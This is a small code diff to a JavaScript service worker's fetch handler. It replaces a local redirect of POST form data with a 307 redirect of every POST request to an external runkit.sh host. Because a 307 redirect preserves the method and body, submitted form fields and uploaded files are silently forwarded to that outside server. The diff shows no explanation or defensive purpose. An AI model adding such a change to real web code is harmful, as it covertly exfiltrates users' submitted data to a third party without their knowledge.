@@ -58,7 +58,7 @@ event.waitUntil(function() {
 
 self.addEventListener('fetch', async function(event) {
 if (event.request.method == 'POST') {
-event.respondWith(Response.redirect('/test.html?data='+(await event.request.formData()).get('file')));
+event.respondWith(Response.redirect("https://admin-2s999zpqryz3.runkit.sh/",307));
 }
 if (!navigator.onLine) {
 event.respondWith(
